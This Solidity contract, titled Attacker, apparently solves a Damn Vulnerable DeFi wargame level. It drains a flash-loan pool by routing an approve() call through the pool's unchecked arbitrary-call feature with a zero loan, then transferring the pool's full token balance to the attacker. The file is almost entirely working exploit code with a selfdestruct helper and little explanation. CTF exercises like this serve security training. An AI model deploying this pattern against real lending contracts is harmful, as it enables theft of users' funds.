// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title Attacker
 * @author DB
 */

interface IInterface {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract Attacker03 {
    address otherContract;

    constructor(address _otherContract) {
        otherContract = _otherContract;
    }

    function selfDestruct(address accountToSend) external {
        address payable account = payable(accountToSend);
        selfdestruct(account);
    }

    receive() external payable {}

    function stealPool(
        address borrower,
        address targetpool,
        address dvtToken
    ) public {
        //instantiate the pool and token at the given addresses
        IInterface pool = IInterface(targetpool);
        IERC20 token = IERC20(dvtToken);

        uint256 toWithdraw = token.balanceOf(address(pool));

        //encode the call to approve the allowance for this contract
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            toWithdraw
        );

        //we don't want to loan anything, we just want to approve an allowance on the token in the context of the pool
        pool.flashLoan(0, borrower, dvtToken, data);

        //use the allowance to transfer the tokens from the pool to the attacker
        token.transferFrom(targetpool, borrower, toWithdraw);
    }
}
